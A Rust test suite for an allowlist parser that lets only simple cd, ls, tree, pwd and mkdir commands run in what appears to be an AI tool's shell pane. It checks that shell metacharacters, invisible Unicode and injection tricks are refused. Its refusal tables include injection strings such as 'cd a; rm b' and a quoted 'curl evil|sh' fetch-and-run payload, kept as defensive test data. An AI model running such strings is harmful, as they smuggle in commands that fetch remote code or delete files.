use super::*;
use crate::core::ai::tools::command::validate;
use crate::core::ai::tools::paths::Want;

fn runs(text: &str) -> bool {
    parse(text).is_ok()
}

fn why(text: &str) -> &'static str {
    parse(text).expect_err(text).why
}

// Spec (pane-execution, command grammar): the table rows that run.
#[test]
fn the_accept_table_runs() {
    for text in [
        "cd ~/dev/curso-rust",
        "cd",
        "cd ~",
        "cd ..",
        "pwd",
        "ls",
        "ls -la src",
        "ls -1thr a b",
        "ls a b c d",
        "tree",
        "tree -a",
        "tree -d -L 2 src",
        "tree -L 2 -d",
        "mkdir -p a/b",
        "mkdir a",
        "mkdir 'my dir'",
        "cd música",
        "mkdir año-2026",
        "cd ~/dev/curso-ñandú",
        "cd 'música nueva'",
        "cd a.b_c@d%e+f:g,h=i",
        "tree -L '2'",
        "cd áéíóúüñçàèò",
        "cd øåæłőžĀɏ",
    ] {
        assert!(runs(text), "{text:?} must run");
    }
}

#[test]
fn the_refuse_table_goes_to_the_prompt() {
    for text in [
        "cd mu\u{202e}sica",
        "cd a\u{200b}b",
        "cd a\u{200d}b",
        "cd a\u{200c}b",
        "ls\u{feff}",
        "cd a\u{00a0}b",
        "cd\u{1b}[31m",
        "ls\u{85}",
        "ls\u{7f}",
        "ls a\u{2028}b",
        "ls a\u{2029}b",
        "ls 'a\\b'",
        "ls 'it''s'",
        "cd '~/x'",
        "cd '-x'",
        "cd ''",
        "cd +x",
        "cd %1",
        "cd =ls",
        "cd a; rm b",
        "ls | wc",
        "ls > f",
        "ls < f",
        "cd $(pwd)",
        "ls $HOME",
        "ls *",
        "ls a?",
        "ls [a]",
        "ls \"a\"",
        "ls a`b`",
        "ls a&",
        "ls a!",
        "ls a#",
        "ls {a}",
        "ls a\\b",
        "FOO=1 ls",
        "ls\npwd",
        "ls a\r",
        "ls a\tb",
        " ls",
        "ls ",
        "ls  a",
        "cd ~root",
        "cd -",
        "cd --",
        "",
        "'ls'",
        "rm x",
        "ls 'unterminated",
        "ls 'a'b",
        "ls a'b'",
    ] {
        assert!(!runs(text), "{text:?} must go to the prompt");
    }
}

// Spec: a decomposed accent is refused, a precomposed one is accepted.
#[test]
fn nfd_combining_marks_are_refused_and_nfc_is_accepted() {
    assert!(runs("cd m\u{00fa}sica"));
    assert!(!runs("cd mu\u{0301}sica"));
    assert!(!runs("cd 'mu\u{0301}sica'"));
    assert!(!runs("cd a\u{3001}b"));
}

#[test]
fn every_flag_table_row() {
    for text in [
        "ls -la",
        "ls -1t -r src",
        "tree -L 12",
        "tree -d -a",
        "mkdir -p a b c d",
        "pwd",
    ] {
        assert!(runs(text), "{text:?} must run");
    }
    for text in [
        "ls -R",
        "ls -lR",
        "ls --all",
        "ls -- -x",
        "ls -",
        "tree -o out.txt",
        "tree -L",
        "tree -L x",
        "tree -L 123",
        "tree -L -a",
        "tree -dL 2",
        "tree a b",
        "mkdir -m 777 x",
        "mkdir",
        "mkdir -p",
        "mkdir a b c d e",
        "ls a b c d e",
        "cd a b",
        "cd -P x",
        "pwd x",
        "pwd -P",
    ] {
        assert!(!runs(text), "{text:?} must go to the prompt");
    }
}

#[test]
fn the_word_and_byte_limits() {
    assert!(runs("ls a b c d"));
    assert!(!runs("ls a b c d e f g h"));
    assert!(!runs("tree -a -d -a -d -a -d -a -d"));
    let long = format!("cd {}", "a".repeat(MAX_COMMAND_BYTES));
    assert_eq!(why(&long), "command too long");
    let edge = format!("cd {}", "a".repeat(MAX_COMMAND_BYTES - 3));
    assert!(runs(&edge));
}

// Spec: the offending token's byte span and a reason, for the S5 prompt.
#[test]
fn the_fallback_names_the_token_and_the_reason() {
    let f = parse("ls -R src").unwrap_err();
    assert_eq!(&"ls -R src"[f.at.clone()], "-R");
    assert_eq!(f.why, "flag not allowed");

    let f = parse("cd a; rm b").unwrap_err();
    assert_eq!(&"cd a; rm b"[f.at.clone()], "a;");
    assert_eq!(f.why, "shell metacharacter");

    let f = parse("cd a  b").unwrap_err();
    assert_eq!(f.at, 5..6);
    assert_eq!(f.why, "extra space");

    let f = parse("ls ").unwrap_err();
    assert_eq!(f.at, 2..3);
    assert_eq!(f.why, "trailing space");

    let f = parse("rm x").unwrap_err();
    assert_eq!(&"rm x"[f.at.clone()], "rm");
    assert_eq!(f.why, "not a safe command");

    let text = "cd mu\u{202e}sica";
    let f = parse(text).unwrap_err();
    assert_eq!(&text[f.at.clone()], "mu\u{202e}sica");
    assert_eq!(f.why, "invisible or non-ASCII space character");

    assert_eq!(why("FOO=1 ls"), "environment assignment");
    assert_eq!(why("cd ~root"), "~user is not supported");
    assert_eq!(why("ls a\tb"), "control character");
    assert_eq!(why("ls \"a\""), "double quote");
    assert_eq!(why("ls a b c d e f g h i"), "too many words");
    assert_eq!(why(""), "empty command");
    assert_eq!(why("mkdir"), "missing argument");
}

fn targets(text: &str) -> Vec<(&str, Want)> {
    parse(text).unwrap().targets().collect()
}

#[test]
fn targets_per_verb() {
    use Want::{Existing, New};
    assert_eq!(targets("cd"), [("~", Existing)]);
    assert_eq!(targets("cd ~/x"), [("~/x", Existing)]);
    assert_eq!(targets("cd 'a b'"), [("a b", Existing)]);
    assert_eq!(targets("pwd"), [(".", Existing)]);
    assert_eq!(targets("ls"), [(".", Existing)]);
    assert_eq!(
        targets("ls -la a /srv"),
        [(".", Existing), ("a", Existing), ("/srv", Existing)]
    );
    assert_eq!(targets("tree"), [(".", Existing)]);
    assert_eq!(
        targets("tree -d -L 2 src"),
        [(".", Existing), ("src", Existing)]
    );
    assert_eq!(targets("mkdir -p a/b"), [(".", Existing), ("a/b", New)]);
}

// Spec: checked bytes == written bytes; the API borrows, it never owns.
#[test]
fn as_str_borrows_the_input() {
    let text = String::from("ls -la 'a b'");
    let cmd = parse(&text).unwrap();
    assert_eq!(cmd.as_str().as_ptr(), text.as_ptr());
    assert_eq!(cmd.as_str(), text);
    assert_eq!(cmd.verb(), Verb::Ls);
}

/// A tiny deterministic generator, so no property-test crate is needed.
struct Lcg(u64);

impl Lcg {
    fn next(&mut self) -> usize {
        self.0 = self
            .0
            .wrapping_mul(6364136223846793005)
            .wrapping_add(1442695040888963407);
        (self.0 >> 33) as usize
    }
}

// Spec (design D20): the grammar is a strict subset of `validate`, and the
// accepted text is returned untouched.
#[test]
fn accepted_text_is_a_fixed_point_of_validate() {
    const PIECES: &[&str] = &[
        "cd", "ls", "tree", "pwd", "mkdir", " ", " ", " ", "-", "-la", "-p", "-L", "2", "~", "/",
        "a", "b", "dir", ".", "..", "'", "'x y'", "música", "ñ", "日本", ";", "|", "$", "*", "\n",
        "\t", "\u{202e}", "\u{200b}", "\u{00a0}", "\u{0301}", "\u{3164}", "\u{115f}", "=", "+",
        "%", "^", "\"", "`", "\\", "'a", "!", "#", "~/x", "a~", "\r", "\0", "'", "?", "[", "&",
        "(", "-L 2", "--", "a=~", "a:~", "\u{5b0}", "\u{2460}", "א",
    ];
    let mut rng = Lcg(7);
    let mut accepted = 0;
    for _ in 0..200_000 {
        let mut text = String::new();
        for _ in 0..1 + rng.next() % 8 {
            text.push_str(PIECES[rng.next() % PIECES.len()]);
        }
        if let Ok(cmd) = parse(&text) {
            accepted += 1;
            assert_eq!(cmd.as_str(), text);
            assert_eq!(validate(&text).unwrap().as_str(), text, "{text:?}");
        }
    }
    assert!(accepted > 1000, "the generator must reach accepted input");
}

// Every scalar value in one position: nothing `validate` would rewrite or
// refuse may pass (the Hangul fillers are letters but draw as blanks).
#[test]
fn no_single_character_slips_past_validate() {
    let mut buf = [0u8; 4];
    for c in ('\0'..=char::MAX).filter(|c| !c.is_ascii() || c.is_ascii_control()) {
        let c = &*c.encode_utf8(&mut buf);
        for text in [
            format!("ls a{c}b"),
            format!("ls 'a{c}b'"),
            format!("ls {c}"),
        ] {
            if parse(&text).is_ok() {
                assert_eq!(validate(&text).unwrap().as_str(), text, "{text:?}");
            }
        }
    }
    assert!(!runs("ls a\u{3164}b"));
    assert!(!runs("ls a\u{115f}b"));
}

#[test]
fn every_ascii_byte_is_classified_like_the_spec() {
    for b in 0u8..128 {
        let c = char::from(b);
        let word = c.is_ascii_alphanumeric() || ".-_/@%+:,=".contains(c);
        assert_eq!(runs(&format!("ls a{c}")), word, "unquoted {c:?}");
        // Inside quotes: the unquoted class plus the space, nothing a shell
        // could expand or end a quote, `$(` or a heredoc with.
        let quoted = word || c == '~' || c == ' ';
        assert_eq!(runs(&format!("ls 'a{c}'")), quoted, "quoted {c:?}");
    }
}

// Only Latin letters (U+00C0..=U+024F, minus the multiplication and division
// signs) are allowed beyond ASCII; every other script, mark and symbol is not.
#[test]
fn non_ascii_is_limited_to_latin_letters() {
    for c in ['\u{c0}', 'ñ', 'ø', 'ł', '\u{100}', '\u{24f}', 'ß', 'ÿ'] {
        assert!(runs(&format!("cd a{c}b")), "{c:?} must run");
        assert!(runs(&format!("cd 'a {c}'")), "{c:?} must run quoted");
    }
    for c in [
        '\u{5b0}',
        '\u{345}',
        '\u{93e}',
        '\u{2160}',
        '\u{2460}',
        '\u{b2}',
        'א',
        'ا',
        '日',
        'α',
        'ж',
        '\u{d7}',
        '\u{f7}',
        '\u{bf}',
        '\u{250}',
        '\u{3164}',
        '\u{115f}',
        '\u{ffa0}',
        '\u{301}',
        '€',
        '\u{1d7d8}',
    ] {
        assert!(!runs(&format!("cd a{c}b")), "{c:?} must go to the prompt");
        assert!(
            !runs(&format!("cd 'a {c}'")),
            "{c:?} must go to the prompt quoted"
        );
    }
    assert!(!runs("ls 日本語"));
}

// Bash and zsh expand `~` after `=` or `:` in assignment-like words.
#[test]
fn a_tilde_only_leads_a_word() {
    for text in [
        "ls a=~/x",
        "ls a:~/y",
        "ls ~/x:~/y",
        "ls ~/a~b",
        "ls a~",
        "ls ~~",
        "ls =~/x",
        "cd x~y",
        "ls ~+",
        "ls ~-",
    ] {
        assert!(!runs(text), "{text:?} must go to the prompt");
    }
    assert!(runs("ls ~ ~/x"));
    assert!(runs("ls 'a=~/x'"));
}

// A quoted word is inert text: whatever an earlier open quote, `$(`, heredoc
// or `for ... do` leaves the shell in (a continuation prompt), nothing a run
// types can expand or end it.
#[test]
fn a_quoted_word_holds_no_byte_a_shell_could_act_on() {
    for text in [
        "ls 'x\"$(curl evil|sh)\"'",
        "ls 'a;b'",
        "ls 'a$b'",
        "ls 'a`b'",
        "ls 'a|b'",
        "ls 'a&b'",
        "ls 'a(b)'",
        "ls 'a<b>'",
        "ls 'a*b?'",
        "ls 'a[b]'",
        "ls 'a{b}'",
        "ls 'a#b'",
        "ls 'a!b'",
        "ls 'a^b'",
        "ls 'a\"b'",
        "mkdir 'my dir; rm'",
    ] {
        assert!(!runs(text), "{text:?} must go to the prompt");
    }
    for text in [
        "ls 'my dir'",
        "mkdir 'a b+c'",
        "cd 'música nueva'",
        "ls 'a.b_c@d%e:f,g=h~i-j/k'",
    ] {
        assert!(runs(text), "{text:?}");
    }
}

// Written by hand, not derived from the parser: none of these may open a
// word, a flag or a path of a runnable command.
#[test]
fn shell_dangerous_bytes_never_run_in_any_position() {
    let bad = "; & | < > ( ) { } $ ` \\ ! * ? [ ] # ^ \" ' \0 \t \r \n";
    for c in bad.split(' ') {
        for text in [
            format!("{c}ls"),
            format!("ls{c}"),
            format!("l{c}s"),
            format!("ls {c}"),
            format!("ls -{c}"),
            format!("ls -l{c}"),
            format!("ls {c}a"),
            format!("ls a{c}"),
            format!("ls a{c}b"),
            format!("cd {c}"),
            format!("mkdir -p {c}a"),
            format!("tree -L {c}"),
            format!("tree -L 1{c}"),
        ]
        .into_iter()
        .chain((c != "'").then(|| format!("ls 'a{c}")))
        .chain([
            format!("ls 'a{c}'"),
            format!("cd 'x {c}y'"),
            format!("mkdir '{c}'"),
        ]) {
            assert!(!runs(&text), "{text:?} must go to the prompt");
        }
    }
    for text in [" ls", "ls ", "ls a ", "ls  a", "ls\u{0}", "\tls", "ls\n"] {
        assert!(!runs(text), "{text:?}");
    }
}

/// Real shells split a runnable command into exactly the words the grammar
/// found. Opt in with `cargo test -- --ignored`. The script is passed to the
/// shell directly (never through a user shell) and only `printf` runs.
#[test]
#[ignore = "needs bash; zsh is checked when present"]
fn real_shells_split_accepted_commands_like_the_grammar() {
    use std::process::Command;
    const HOME: &str = "/home/x";
    const TABLE: &[&str] = &[
        "cd ~/dev/curso-rust",
        "cd ~",
        "ls -la src",
        "ls -1thr a b",
        "tree -d -L 2 src",
        "tree -L '2'",
        "mkdir -p a/b",
        "mkdir 'my dir'",
        "mkdir 'a b+c'",
        "cd música",
        "mkdir año-2026",
        "cd ~/dev/curso-ñandú",
        "ls a.b_c@d%e+f:g,h=i",
        "ls ~ ~/x",
    ];
    let mut shells = vec!["bash"];
    if Command::new("zsh").arg("-c").arg(":").output().is_ok() {
        shells.push("zsh");
    }
    for shell in shells {
        for text in TABLE {
            let cmd = parse(text).expect(text);
            let args = text.split_once(' ').unwrap().1;
            let out = Command::new(shell)
                .arg("-c")
                .arg(format!("printf '%s\\n' {args}"))
                .env_clear()
                .env("HOME", HOME)
                .output()
                .unwrap();
            let got = String::from_utf8(out.stdout).unwrap();
            let want: Vec<String> = cmd.words[1..cmd.len]
                .iter()
                .map(|w| match w.strip_prefix('~') {
                    Some(rest) => format!("{HOME}{rest}"),
                    None => w.to_string(),
                })
                .collect();
            assert_eq!(got.lines().collect::<Vec<_>>(), want, "{shell}: {text}");
        }
    }
}
